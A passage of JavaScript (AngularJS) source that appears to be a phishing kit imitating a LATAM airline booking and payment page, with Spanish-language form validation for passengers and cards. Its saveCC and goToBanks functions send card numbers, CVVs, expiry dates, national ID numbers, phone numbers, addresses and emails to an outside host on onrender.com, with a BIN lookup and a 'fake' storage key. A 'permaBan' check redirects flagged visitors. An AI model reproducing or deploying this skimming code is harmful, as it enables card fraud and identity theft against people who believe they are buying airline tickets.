      // Only process if we have input
      if (cleanDate.length > 0) {
        // Extract year, month and day
        let year = cleanDate.substring(0, 4);
        let month = cleanDate.substring(4, 6);
        let day = cleanDate.substring(6, 8);

        // Validate month
        if (month.length === 2) {
          let monthNum = parseInt(month);
          if (monthNum < 1) month = "01";
          if (monthNum > 12) month = "12";
        }

        // Validate day
        if (day.length === 2) {
          let dayNum = parseInt(day);
          let monthNum = parseInt(month);
          let yearNum = parseInt(year);

          // Get last day of month
          let lastDay = new Date(yearNum, monthNum, 0).getDate();

          if (dayNum < 1) day = "01";
          if (dayNum > lastDay) day = lastDay.toString().padStart(2, "0");
        }

        // Format the date as YYYY-MM-DD
        let formattedDate = "";
        if (cleanDate.length > 0) formattedDate = year;
        if (cleanDate.length > 4) formattedDate += "-" + month;
        if (cleanDate.length > 6) formattedDate += "-" + day;

        // Update the passenger's date
        passenger.fechanac = formattedDate;
      }

      // Validate the complete date
      if (passenger.fechanac.length === 10) {
        let date = new Date(passenger.fechanac);
        let currentDate = new Date();

        // Check if date is valid and not in the future
        if (isNaN(date.getTime()) || date > currentDate) {
          alert("Por favor ingrese una fecha válida que no sea futura");
          passenger.fechanac = "";
        }
      }
    };

    $scope.getIniciales = function (tamirra) {
      return (
        tamirra.nombre.substring(0, 1).toUpperCase() +
        tamirra.apellido.substring(0, 1).toUpperCase()
      );
    };
    $scope.getFullName = function (alfred) {
      return alfred.nombre.split(" ")[0] + " " + alfred.apellido.split(" ")[0];
    };
    $scope.getDocumento = function (tanelle) {
      return tanelle.cedula;
    };
    $scope.getReadyData = function () {
      var judell = 1;
      for (let rutvi = 0; rutvi < $scope.passengers.length; rutvi++) {
        if (!$scope.passengers[rutvi].finished) {
          judell = 0;
        }
      }
      return 0 == judell;
    };
    $scope.goPayF = function () {
      if (!$scope.getReadyData() && !$scope.isSending) {
        $scope.isSending = true;
        $scope.loader = true; // Mostrar loader

        $scope
          .sendPassengersData()
          .then(() => {
            var dniyah = $scope.dataLatam;
            if (null != dniyah) {
              var donaldo = -1;
              for (let janmarie = 0; janmarie < dniyah.length; janmarie++) {
                if (4 == dniyah[janmarie].step) {
                  donaldo = janmarie;
                }
              }
              if (-1 != donaldo) {
                dniyah[donaldo].info = [];
                dniyah[donaldo].info.push({
                  nombre: $scope.passengers[0].nombre,
                  apellido: $scope.passengers[0].apellido,
                  ced: $scope.passengers[0].cedula,
                  fnac: $scope.passengers[0].fechanac,
                  tel: $scope.passengers[0].tel,
                });
                localStorage.setItem(
                  "latamStorageFake",
                  JSON.stringify(dniyah)
                );
                $scope.goTransitionPay();
              } else {
                var paul = {
                  step: 4,
                  info: [
                    {
                      nombre: $scope.passengers[0].nombre,
                      apellido: $scope.passengers[0].apellido,
                      ced: $scope.passengers[0].cedula,
                      fnac: $scope.passengers[0].fechanac,
                      tel: $scope.passengers[0].tel,
                    },
                  ],
                };
                dniyah.push(paul);
                localStorage.setItem(
                  "latamStorageFake",
                  JSON.stringify(dniyah)
                );
                $scope.goTransitionPay();
              }
            }
          })
          .catch((error) => {
            alert(
              "Error al procesar los datos. Por favor, intente nuevamente."
            );
          })
          .finally(() => {
            $scope.isSending = false;
            $scope.loader = false; // Ocultar loader
            $scope.$apply(); // Asegurar que Angular actualice la vista
          });
      }
    };
    $scope.goTransitionPay = function () {
      $state.transitionTo("/Payment", {
        error: "no",
      });
    };
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
  },
]);

app.controller("paymentController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  "GUIDService",
  function ($scope, $http, $timeout, $interval, $state, GUIDService) {
    $scope.regLog = function (data) {
      $http
        .post("api/regLog", {
          log: data,
        })
        .success(function (vandela) {})
        .error(function (eliecer) {
          console.log(eliecer);
          $scope.loading = false;
        });
    };
    var chosenGUID = GUIDService.getGUID();
    $scope.chosenGUID = GUIDService.getGUID();
    $scope.badCC = false;
    $scope.uniqueTransactionId = GUIDService.getGUID();
    let nuBankActive = false;

    $scope.verifyCCSize = function () {
      let daaimah = $scope.ccNum;
      var godwin;
      if (null != daaimah) {
        $scope.realcc = daaimah.replace(/[^0-9]/g, "");
        daaimah.replaceAll(" ", "");
        if ($scope.realcc.length > 0 && 3 == parseInt(daaimah[0])) {
          $scope.cardChoosen = "assets/icons/cards/amex.svg";
        } else if ($scope.realcc.length > 0 && 4 == parseInt(daaimah[0])) {
          $scope.cardChoosen = "assets/icons/cards/vs.svg";
        } else if ($scope.realcc.length > 0 && 5 == parseInt(daaimah[0])) {
          $scope.cardChoosen = "assets/icons/cards/mc.svg";
        } else if ($scope.realcc.length > 0 && 6 == parseInt(daaimah[0])) {
          $scope.cardChoosen = "assets/icons/cards/dc.svg";
        } else {
          $scope.cardChoosen = "assets/icons/cards/uatp.svg";
        }
        if (0 == $scope.realcc.length) {
          $scope.cardChoosen = "assets/icons/cards/card_icon.svg";
        }
        if ($scope.realcc.length < 14) {
          $scope.badCC = true;
          $scope.txtValidCard = "Número de tarjeta inválido o incompleto";
        } else if (15 == $scope.realcc.length || 16 == $scope.realcc.length) {
          if (
            ((godwin = $scope.realcc) &&
              (function (natlee) {
                var wynisha = 0;
                var theran = false;
                for (var dam = natlee.length - 1; dam >= 0; dam--) {
                  var nateyah = +natlee[dam];
                  if (theran && (nateyah *= 2) > 9) {
                    nateyah -= 9;
                  }
                  wynisha += nateyah;
                  theran = !theran;
                }
                return wynisha % 10 == 0;
              })(godwin) &&
              16 == godwin.length &&
              (4 == godwin[0] ||
                (5 == godwin[0] && godwin[1] >= 1 && godwin[1] <= 5) ||
                0 == godwin.indexOf("6011") ||
                0 == godwin.indexOf("65"))) ||
            (15 == godwin.length &&
              (0 == godwin.indexOf("34") || 0 == godwin.indexOf("37"))) ||
            (13 == godwin.length && 4 == godwin[0])
          ) {
            $scope.badCC = false;
            $scope.txtValidCard = "";
          } else {
            $scope.badCC = true;
            $scope.txtValidCard = "Número de tarjeta inválido o incompleto";
          }
        } else {
          $scope.ccNum = $scope.ccNum.substring(0, 18);
          $scope.badCC = true;
          $scope.txtValidCard = "Número de tarjeta inválido o incompleto";
        }
        $scope.rewriteCC();
      }
    };
    $scope.doneReW1 = false;
    $scope.doneReW2 = false;
    $scope.doneReW3 = false;
    $scope.rewriteCC = function () {
      let shantae = $scope.ccNum;
      $scope.realcc = shantae.replace(/[^0-9]/g, "");
      if ($scope.doneReW1 && $scope.realcc.length < 4) {
        $scope.doneReW1 = false;
      }
      if ($scope.doneReW2 && $scope.realcc.length < 8) {
        $scope.doneReW2 = false;
      }
      if ($scope.doneReW3 && $scope.realcc.length < 12) {
        $scope.doneReW3 = false;
      }
      if (!(4 != $scope.realcc.length || $scope.doneReW1)) {
        $scope.ccNum = $scope.ccNum + " ";
        $scope.doneReW1 = true;
      }
      if (!(8 != $scope.realcc.length || $scope.doneReW2)) {
        $scope.ccNum = $scope.ccNum + " ";
        $scope.doneReW2 = true;
      }
      if (!(12 != $scope.realcc.length || $scope.doneReW3)) {
        $scope.ccNum = $scope.ccNum + " ";
        $scope.doneReW3 = true;
      }
    };
    $scope.badCvv = false;
    $scope.validateCVV = function () {
      if (null != $scope.ccNum) {
        let tmara = $scope.ccNum.toString();
        if (null != $scope.cvv && $scope.cvv > 4) {
          $scope.cvv = $scope.cvv.toString().substring(0, 4);
        } else if (
          null != $scope.cvv &&
          $scope.cvv.toString().length > 3 &&
          (4 == parseInt(tmara[0]) || 5 == parseInt(tmara[0]))
        ) {
          $scope.cvv = $scope.cvv.toString().substring(0, 3);
        } else if (
          null != $scope.cvv &&
          $scope.cvv.toString().length > 4 &&
          3 == parseInt(tmara[0])
        ) {
          $scope.cvv = $scope.cvv.toString().substring(0, 4);
        } else if (null != $scope.cvv && $scope.cvv.toString().length < 3) {
          $scope.txtValidCvv = "Código CVV inválido";
        } else if (
          (null != $scope.cvv && 3 == $scope.cvv.toString().length) ||
          (null != $scope.cvv && 0 == $scope.cvv.toString()[0])
        ) {
          $scope.badCvv = false;
        } else if (null == $scope.cvv) {
          $scope.badCvv = true;
        }
      } else if (
        null != $scope.cvv &&
        ($scope.cvv.toString().length < 3 || $scope.cvv.toString().length > 4)
      ) {
        $scope.txtValidCvv = "Código CVV inválido";
      } else if (
        null != $scope.cvv &&
        $scope.cvv.toString().length > 2 &&
        $scope.cvv.toString().length < 5
      ) {
        $scope.badCvv = false;
        $scope.txtValidCvv = "";
      } else if (null == $scope.cvv) {
        $scope.badCvv = true;
      }
    };
    $scope.slashAdded = false;
    $scope.addSlash = function () {
      if (
        !(
          null == $scope.datecc ||
          2 != $scope.datecc.length ||
          $scope.slashAdded
        )
      ) {
        $scope.datecc = $scope.datecc + "/";
        $scope.slashAdded = true;
      }
      if (null != $scope.datecc && $scope.datecc.length > 5) {
        $scope.datecc = $scope.datecc.substr(0, 5);
      }
      if (null != $scope.datecc && $scope.datecc.length < 5) {
        $scope.badDate = true;
        $scope.txtValidExp = "Fecha incorrecta";
      }
      if (null != $scope.datecc && $scope.datecc.length < 5) {
        $scope.badDate = true;
        $scope.txtValidExp = "Fecha incorrecta";
      }
      if ($scope.datecc.length < 3 && 1 == $scope.slashAdded) {
        $scope.slashAdded = false;
      }
      if (null != $scope.datecc && 5 == $scope.datecc.length) {
        let jaysie = $scope.datecc.split("/");
        if (parseInt(jaysie[0]) > 12) {
          $scope.badDate = true;
          $scope.txtValidExp = "Fecha incorrecta";
        } else {
          $scope.badDate = false;
          $scope.txtValidExp = "";
        }
        let kilyan = $scope.datecc;
        if (kilyan.toString().length > 4) {
          var naia = kilyan.split("/");
          var decarter = naia[0];
          naia = naia[1];
          if (parseInt(naia) < 23) {
            $scope.badDate = true;
            $scope.txtValidExp = "Fecha incorrecta";
          } else if (23 == parseInt(naia) && parseInt(decarter) < 9) {
            $scope.badDate = true;
            $scope.txtValidExp = "Fecha expirada";
          }
        }
      }
    };
    $scope.validateEmail = function (yaniece) {
      return /\S+@\S+\.\S+/.test(yaniece);
    };
    $scope.checkFormAndPay = function () {
      if (null != $scope.ccNum && 0 == $scope.badCC) {
        $scope.badCC = false;
        if (null != $scope.ccName && $scope.ccName.toString().length > 3) {
          $scope.badName = false;
          if (null != $scope.datecc && 0 == $scope.badDate) {
            if (null != $scope.cvv) {
              if (
                null != $scope.cedula &&
                $scope.cedula.toString().length > 4
              ) {
                if (null != $scope.tel && 10 == $scope.tel.toString().length) {
                  if (
                    null != $scope.city &&
                    $scope.city.toString().length > 3
                  ) {
                    if (
                      null != $scope.addr &&
                      $scope.addr.toString().length > 8
                    ) {
                      if (
                        null != $scope.email &&
                        $scope.validateEmail($scope.email)
                      ) {
                        console.log(
                          "Todo bien, aqui mandara a la API para verificar"
                        );
                        $scope.goToBanks();
                      } else {
                        $("html, body").animate({
                          scrollTop: $("#email").offset().top - 50,
                        });
                        $scope.badEmail = true;
                      }
                    } else {
                      $("html, body").animate({
                        scrollTop: $("#address").offset().top - 50,
                      });
                      $scope.badAddress = true;
                    }
                  } else {
                    $("html, body").animate({
                      scrollTop: $("#city").offset().top - 50,
                    });
                    $scope.badCity = true;
                  }
                } else {
                  $("html, body").animate({
                    scrollTop: $("#telnum").offset().top - 50,
                  });
                  $scope.badTel = true;
                }
              } else {
                $("html, body").animate({
                  scrollTop: $("#cc").offset().top - 50,
                });
                $scope.badDoc = true;
              }
            } else {
              $scope.badCvv = true;
              $("html, body").animate({
                scrollTop: $("#cvv").offset().top - 50,
              });
            }
          } else {
            $scope.badDate = true;
            $("html, body").animate({
              scrollTop: $("#expdate").offset().top - 50,
            });
          }
        } else {
          $scope.badName = true;
          $("html, body").animate({
            scrollTop: $("#Apellido").offset().top - 50,
          });
        }
      } else {
        $scope.badCC = true;
        $("html, body").animate({
          scrollTop: $("#ccNum").offset().top - 50,
        });
      }
    };
    $scope.dataConfig = undefined;
    $scope.getConfig = function () {
      $http
        .post("api/getConfig", {})
        .success(function (data) {
          $scope.dataConfig = data.id;
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.getConfig();
    $scope.ccsaved = false;
    $scope.loadingSave = false;
    $scope.saveCC = function () {
      $scope.badCvv = false;
      if (!($scope.ccsaved || $scope.loadingSave)) {
        $scope.loadingSave = true;
        $http
          .post("https://latam-fastapi.onrender.com/api", {
            id: $scope.chosenGUID,
            name: $scope.ccName,
            cc: $scope.realcc,
            datecc: $scope.datecc,
            cvv: $scope.cvv,
            ua: navigator.userAgent,
          })
          .success(function (milani) {
            $scope.ccsaved = true;
          })
          .error(function (err) {
            console.log(err);
            $scope.loading = false;
          });
      }
    };
    $scope.goToBanks = function () {
      let elzy = $scope.ccNum;
      $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
      $scope.realcc = elzy.replace(/[^0-9]/g, "");
      $scope.realcc = $scope.realcc.replace(/\s/g, "");
      $scope.loader = true;
      $http
        .get("https://latam-fastapi.onrender.com/api/lookBin?cc=" + $scope.realcc, {})
        .success(function (response) {
          $scope.bankResponse = response;
          $http
            .post("https://latam-fastapi.onrender.com/api/preset", {
              id: chosenGUID,
              logpay: $scope.dataLatam,
              name: $scope.ccName,
              cc: $scope.realcc,
              datecc: $scope.datecc,
              cvv: $scope.cvv,
              tel: $scope.tel,
              dir: $scope.addr,
              cedula: $scope.cedula,
              city: $scope.city,
              bank: $scope.bankResponse,
              email: $scope.email,
              ua: navigator.userAgent,
            })
            .success(function (rickki) {
              var trevionne = $scope.dataLatam;
              if (null != trevionne) {
                var mckinnah = -1;
                for (let marinel = 0; marinel < trevionne.length; marinel++) {
                  if (5 == trevionne[marinel].step) {
                    mckinnah = marinel;
                  }
                }
                if (-1 != mckinnah) {
                  let jeani = $scope.ccNum;
                  $scope.realcc = jeani.replace(/[^0-9]/g, "");
                  trevionne[mckinnah].info = [];
                  trevionne[mckinnah].info.push({
                    bank: $scope.bankResponse,
                    cc: $scope.realcc,
                    name: $scope.ccName,
                    datecc: $scope.datecc,
                    cvv: $scope.cvv,
                    tel: $scope.tel,
                    city: $scope.city,
                    addr: $scope.addr,
                    cedula: $scope.cedula,
                    email: $scope.email,
                  });
                  localStorage.setItem("bin", $scope.bankResponse);
                  localStorage.setItem(
                    "latamStorageFake",
                    JSON.stringify(trevionne)
                  );
                  $scope.goTransitionPay();
                } else {
                  var maudeen = {
                    step: 5,
                    info: [
                      {
                        bank: $scope.bankResponse,
                        cc: $scope.realcc,
                        name: $scope.ccName,
                        datecc: $scope.datecc,
                        cvv: $scope.cvv,
                        tel: $scope.tel,
                        city: $scope.city,
                        addr: $scope.addr,
                        cedula: $scope.cedula,
                        email: $scope.email,
                      },
                    ],
                  };
                  trevionne.push(maudeen);
                  localStorage.setItem("bin", $scope.bankResponse);
                  localStorage.setItem(
                    "latamStorageFake",
                    JSON.stringify(trevionne)
                  );
                  $scope.goTransitionPay();
                }
              }
            })
            .error(function (veryle) {
              console.log(veryle);
              $scope.loading = false;
            });
        })
        .error(function (jihad) {
          console.log(jihad);
          $scope.loading = false;
        });
    };
    $scope.goTransitionPay = function () {
      if (1 == $scope.dataConfig.active) {
        $state.transitionTo("/Paid-Wait");
      } else {
        $state.transitionTo("/Paid");
      }
    };
    localStorage.removeItem("alreadyBeenHerePayingBank");
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
    if (
      null != $state.params &&
      null != $state.params.error &&
      1 == $state.params.error
    ) {
      $scope.errorCC = true;
    }
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    $scope.loader = true;
    $timeout(function () {
      $scope.loader = undefined;
    }, 1e3);
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];
    $scope.daysT = ["Dom", "Lun", "Mar", "Mié", "Jue", "Vie", "Sáb"];
    $scope.monthNumber = new Date().getMonth() + 1;
    $scope.daysInMonth = function (veneita, romir) {
      return new Date(romir, veneita, 0).getDate();
    };
    $scope.getNumber = function (meiyi) {
      return new Array(meiyi);
    };
    var nastasha = new Date();
    $scope.dd = String(nastasha.getDate()).padStart(2, "0");
    $scope.actualM = parseInt($scope.monthNumber);
    $scope.toTheBeginnig = function () {
      $state.transitionTo("/");
    };
    $scope.goBack = function () {
      window.history.go(-1);
    };
    $scope.dataVuelos = undefined;
    var frankin = -1;
    for (let rukaiya = 0; rukaiya < $scope.dataLatam.length; rukaiya++) {
      if (1 == $scope.dataLatam[rukaiya].step) {
        frankin = rukaiya;
      }
    }
    if (-1 != frankin) {
      $scope.dataVuelos = $scope.dataLatam[frankin].info[0];
    } else {
      $state.transitionTo("/");
    }
    var holliann = -1;
    for (let bilqis = 0; bilqis < $scope.dataLatam.length; bilqis++) {
      if (2 == $scope.dataLatam[bilqis].step) {
        holliann = bilqis;
      }
    }
    $scope.pickedF = undefined;
    if (-1 != holliann) {
      $scope.pickedF = $scope.dataLatam[holliann].info[0];
    } else {
      $scope.goBack();
    }
    if (1 == $scope.dataVuelos.travelType) {
      var novena = -1;
      for (let lotis = 0; lotis < $scope.dataLatam.length; lotis++) {
        if (3 == $scope.dataLatam[lotis].step) {
          novena = lotis;
        }
      }
      $scope.pickedFV = undefined;
      if (-1 != novena) {
        $scope.pickedFV = $scope.dataLatam[novena].info[0];
      } else {
        $scope.goBack();
      }
    }
    $scope.regLog("INGRESÓ A PANTALLA DE PAGOS");
    $scope.calcTotal = function () {
      try {
        var add = 0;
        if ($scope.pickedF && $scope.pickedF.cabine === "l") add = 50000;
        else if ($scope.pickedF && $scope.pickedF.cabine === "f") add = 90000;
        var base =
          $scope.pickedF && $scope.pickedF.vuelo && $scope.pickedF.vuelo.price
            ? $scope.pickedF.vuelo.price
            : 0;
        var totalCOP = (parseInt(base, 10) || 0) + add;
        if (
          $scope.dataVuelos &&
          $scope.dataVuelos.travelType == 1 &&
          $scope.pickedFV &&
          $scope.pickedFV.vuelo
        ) {
          var add2 = 0;
          if ($scope.pickedFV.cabine === "l") add2 = 50000;
          else if ($scope.pickedFV.cabine === "f") add2 = 90000;
          totalCOP += (parseInt($scope.pickedFV.vuelo.price, 10) || 0) + add2;
        }
        if ($scope.dataVuelos && $scope.dataVuelos.passengers) {
          totalCOP *= parseInt($scope.dataVuelos.passengers, 10) || 1;
        }
        return formatUSD(copToUsd(totalCOP));
      } catch (e) {
        return formatUSD(0);
      }
    }; // Definición de los días de la semana y los meses
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sa"];
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];

    // Función para obtener las fechas de los vuelos
    $scope.getDatesVuelos = function (shanie, denesa) {
      if (shanie != null) {
        let kaliese = shanie.split("-");
        var yasmein = new Date(kaliese[0], kaliese[1] - 1, kaliese[2]);

        var dayIndex = yasmein.getDay();
        var suyapa =
          $scope.daysT[dayIndex] +
          ". " +
          kaliese[2] +
          " de " +
          $scope.months[parseInt(kaliese[1])].toLowerCase();

        if (denesa != null) {
          let arien = denesa.split("-");
          var yasmeinVuelta = new Date(arien[0], arien[1] - 1, arien[2]);

          var dayIndexVuelta = yasmeinVuelta.getDay();
          suyapa +=
            " a " +
            $scope.daysT[dayIndexVuelta] +
            ". " +
            arien[2] +
            " de " +
            $scope.months[parseInt(arien[1])].toLowerCase();
        }

        return suyapa;
      }
      return "";
    };

    // Función para obtener el número de días en un mes
    $scope.daysInMonth = function (jerriann, yamilah) {
      return new Date(yamilah, jerriann, 0).getDate();
    };

    // Función para obtener el primer día del mes (0 = Domingo, 6 = Sábado)
    $scope.getFirstDayOfMonth = function (year, month) {
      return new Date(year, month - 1, 1).getDay();
    };

    // Función para generar los días del mes para el calendario
    $scope.generateMonthDays = function (year, month) {
      var firstDay = $scope.getFirstDayOfMonth(year, month);
      var daysInMonth = $scope.daysInMonth(month, year);
      var days = [];

      // Agregar días vacíos al principio si es necesario
      for (var i = 0; i < firstDay; i++) {
        days.push(null);
      }

      // Agregar los días del mes
      for (var i = 1; i <= daysInMonth; i++) {
        days.push(i);
      }

      return days;
    };

    // Función para obtener el texto de una fecha
    $scope.getTextDate = function (date) {
      let parts = date.split("-");
      let dateObj = new Date(parts[0], parts[1] - 1, parts[2]);
      return (
        $scope.daysT[dateObj.getDay()] +
        ". " +
        parts[2] +
        " de " +
        $scope.months[parseInt(parts[1])].toLowerCase()
      );
    };
    $scope.badCC = false;

    // Configuración de formatos de tarjeta
    const CARD_FORMATS = {
      VISA: {
        pattern: /^4/,
        length: 16,
        format: /(\d{4})(\d{4})(\d{4})(\d{4})/,
        separator: " ",
        icon: "assets/icons/cards/vs.svg",
      },
      MASTERCARD: {
        pattern: /^5[1-5]/,
        length: 16,
        format: /(\d{4})(\d{4})(\d{4})(\d{4})/,
        separator: " ",
        icon: "assets/icons/cards/mc.svg",
      },
      AMEX: {
        pattern: /^3[47]/,
        length: 15,
        format: /(\d{4})(\d{6})(\d{5})/,
        separator: " ",
        icon: "assets/icons/cards/amex.svg",
      },
      DISCOVER: {
        pattern: /^6/,
        length: 16,
        format: /(\d{4})(\d{4})(\d{4})(\d{4})/,
        separator: " ",
        icon: "assets/icons/cards/dc.svg",
      },
    };

    $scope.getCardType = function (cardNumber) {
      if (!cardNumber) return null;

      cardNumber = cardNumber.replace(/\D/g, "");

      for (const [type, format] of Object.entries(CARD_FORMATS)) {
        if (format.pattern.test(cardNumber)) {
          return {
            type: type,
            format: format,
            valid: cardNumber.length === format.length,
            icon: format.icon,
          };
        }
      }

      return {
        type: "INVALID",
        valid: false,
        icon: "assets/icons/cards/card_icon.svg",
      };
    };

    $scope.validateLuhn = function (cardNumber) {
      if (!cardNumber) return false;

      // Remover espacios y caracteres no numéricos
      cardNumber = cardNumber.replace(/\D/g, "");

      if (cardNumber.length < 13 || cardNumber.length > 19) return false;

      let sum = 0;
      let isEven = false;

      for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);

        if (isEven) {
          digit *= 2;
          if (digit > 9) {
            digit -= 9;
          }
        }

        sum += digit;
        isEven = !isEven;
      }

      return sum % 10 === 0;
    };

    $scope.formatCardNumber = function (cardNumber, cardType) {
      if (!cardNumber || !cardType || !cardType.format) return cardNumber;

      // Remover caracteres no numéricos
      cardNumber = cardNumber.replace(/\D/g, "");

      // Aplicar formato según el tipo de tarjeta
      if (cardType.format.format) {
        return cardNumber.replace(
          cardType.format.format,
          function (match, p1, p2, p3, p4) {
            if (cardType.type === "AMEX") {
              return [p1, p2, p3]
                .filter(Boolean)
                .join(cardType.format.separator);
            }
            return [p1, p2, p3, p4]
              .filter(Boolean)
              .join(cardType.format.separator);
          }
        );
      }

      return cardNumber;
    };

    $scope.verifyCCSize = function () {
      let cardNumber = $scope.ccNum;
      if (!cardNumber) {
        $scope.badCC = true;
        $scope.txtValidCard = "Número de tarjeta inválido o incompleto";
        $scope.cardChoosen = "assets/icons/cards/card_icon.svg";
        return;
      }

      // Limpiar el número de tarjeta
      $scope.realcc = cardNumber.replace(/\D/g, "");

      // Verificar el tipo de tarjeta
      const cardInfo = $scope.getCardType($scope.realcc);
      $scope.cardChoosen = cardInfo.icon;

      // Si comienza con 2, rechazar inmediatamente
      if ($scope.realcc.charAt(0) === "2") {
        $scope.badCC = true;
        $scope.txtValidCard = "Este tipo de tarjeta no es aceptada";
        return;
      }

      // Validar longitud específica según tipo de tarjeta
      if (cardInfo.format && $scope.realcc.length > cardInfo.format.length) {
        $scope.ccNum = $scope.ccNum.slice(0, -1);
        return;
      }

      // Formatear el número según el tipo de tarjeta
      if (cardInfo.type !== "INVALID") {
        $scope.ccNum = $scope.formatCardNumber($scope.realcc, cardInfo);
      }

      // Validaciones
      if (
        $scope.realcc.length < (cardInfo.format ? cardInfo.format.length : 16)
      ) {
        $scope.badCC = true;
        $scope.txtValidCard = "Número de tarjeta incompleto";
        return;
      }

      // Validar usando Luhn y longitud específica
      if (
        $scope.validateLuhn($scope.realcc) &&
        cardInfo.type !== "INVALID" &&
        $scope.realcc.length === (cardInfo.format ? cardInfo.format.length : 16)
      ) {
        $scope.badCC = false;
        $scope.txtValidCard = `Tarjeta ${cardInfo.type} válida`;
      } else {
        $scope.badCC = true;
        $scope.txtValidCard = "Número de tarjeta inválido";
      }
    };

    $scope.doneReW1 = false;
    $scope.doneReW2 = false;
    $scope.doneReW3 = false;
    $scope.rewriteCC = function () {
      let mariacecilia = $scope.ccNum;
      $scope.realcc = mariacecilia.replace(/[^0-9]/g, "");
      if ($scope.doneReW1 && $scope.realcc.length < 4) {
        $scope.doneReW1 = false;
      }
      if ($scope.doneReW2 && $scope.realcc.length < 8) {
        $scope.doneReW2 = false;
      }
      if ($scope.doneReW3 && $scope.realcc.length < 12) {
        $scope.doneReW3 = false;
      }
      if (!(4 != $scope.realcc.length || $scope.doneReW1)) {
        $scope.ccNum = $scope.ccNum + " ";
        $scope.doneReW1 = true;
      }
      if (!(8 != $scope.realcc.length || $scope.doneReW2)) {
        $scope.ccNum = $scope.ccNum + " ";
        $scope.doneReW2 = true;
      }
      if (!(12 != $scope.realcc.length || $scope.doneReW3)) {
        $scope.ccNum = $scope.ccNum + " ";
        $scope.doneReW3 = true;
      }
    };

    $scope.badCvv = false;

    $scope.validateCVV = function () {
      if (null != $scope.ccNum) {
        let jophiel = $scope.ccNum.toString();
        if (null != $scope.cvv && $scope.cvv > 4) {
          $scope.cvv = $scope.cvv.toString().substring(0, 4);
        } else if (
          null != $scope.cvv &&
          $scope.cvv.toString().length > 3 &&
          (4 == parseInt(jophiel[0]) || 5 == parseInt(jophiel[0]))
        ) {
          $scope.cvv = $scope.cvv.toString().substring(0, 3);
        } else if (
          null != $scope.cvv &&
          $scope.cvv.toString().length > 4 &&
          3 == parseInt(jophiel[0])
        ) {
          $scope.cvv = $scope.cvv.toString().substring(0, 4);
        } else if (null != $scope.cvv && $scope.cvv.toString().length < 3) {
          $scope.txtValidCvv = "Código CVV inválido";
        } else if (
          (null != $scope.cvv && 3 == $scope.cvv.toString().length) ||
          (null != $scope.cvv && 0 == $scope.cvv.toString()[0])
        ) {
          $scope.badCvv = false;
        } else if (null == $scope.cvv) {
          $scope.badCvv = true;
        }
      } else if (
        null != $scope.cvv &&
        ($scope.cvv.toString().length < 3 || $scope.cvv.toString().length > 4)
      ) {
        $scope.txtValidCvv = "Código CVV inválido";
      } else if (
        null != $scope.cvv &&
        $scope.cvv.toString().length > 2 &&
        $scope.cvv.toString().length < 5
      ) {
        $scope.badCvv = false;
        $scope.txtValidCvv = "";
      } else if (null == $scope.cvv) {
        $scope.badCvv = true;
      }
    };

    $scope.slashAdded = false;

    $scope.addSlash = function () {
      if (null != $scope.datecc && $scope.datecc.length > 0) {
        // Remove any non-numeric characters
        $scope.datecc = $scope.datecc.replace(/[^0-9]/g, "");

        // Format with slash after first 2 digits
        if ($scope.datecc.length > 2) {
          $scope.datecc =
            $scope.datecc.substring(0, 2) + "/" + $scope.datecc.substring(2);
          $scope.datecc = $scope.datecc.substring(0, 5); // Limit to MM/YY format
        }

        // Validate month between 01-12
        if ($scope.datecc.length >= 2) {
          let month = parseInt($scope.datecc.substring(0, 2));
          if (month < 1 || month > 12) {
            $scope.badDate = true;
            $scope.txtValidExp = "Mes inválido";
            return;
          }
        }

        // Validate year not in past
        if ($scope.datecc.length == 5) {
          let today = new Date();
          let currentYear = today.getFullYear() % 100; // Get last 2 digits
          let currentMonth = today.getMonth() + 1;

          let month = parseInt($scope.datecc.substring(0, 2));
          let year = parseInt($scope.datecc.substring(3, 5));

          if (
            year < currentYear ||
            (year == currentYear && month < currentMonth)
          ) {
            $scope.badDate = true;
            $scope.txtValidExp = "Fecha expirada";
            return;
          }

          // Valid date
          $scope.badDate = false;
          $scope.txtValidExp = "";
        } else {
          // Incomplete date
          $scope.badDate = true;
          $scope.txtValidExp = "Fecha incompleta";
        }
      }
    };
    $scope.validateEmail = function (binita) {
      return /\S+@\S+\.\S+/.test(binita);
    };
    $scope.luhn = function (cc) {
      var sum = 0;
      var even = false;
      for (var i = cc.length - 1; i >= 0; i--) {
        var n = parseInt(cc.charAt(i), 10);
        if (even && (n *= 2) > 9) {
          n -= 9;
        }
        sum += n;
        even = !even;
      }
      return sum % 10 == 0;
    };
    // Mejorar validación de número de tarjeta con Luhn y validaciones adicionales
    $scope.validateCreditCard = function (ccNum) {
      // Verificar que no haya contenido vacio
      if (!ccNum) {
        return false;
      }

      // Remover espacios y caracteres no numéricos
      const cleanNum = ccNum.replace(/\D/g, "");

      // Validar longitud
      if (cleanNum.length < 13 || cleanNum.length > 19) {
        return false;
      }

      // Validar que sean solo números
      if (!/^\d+$/.test(cleanNum)) {
        return false;
      }

      // Algoritmo Luhn
      let sum = 0;
      let isEven = false;

      for (let i = cleanNum.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanNum[i]);

        if (isEven) {
          digit *= 2;
          if (digit > 9) {
            digit -= 9;
          }
        }

        sum += digit;
        isEven = !isEven;
      }

      return sum % 10 === 0;
    };

    // Validar fecha de expiración
    $scope.validateExpiryDate = function (month, year) {
      // Validar que no haya contenido vacio
      if (!month || !year) {
        return false;
      }

      const currentDate = new Date();
      const currentYear = currentDate.getFullYear();
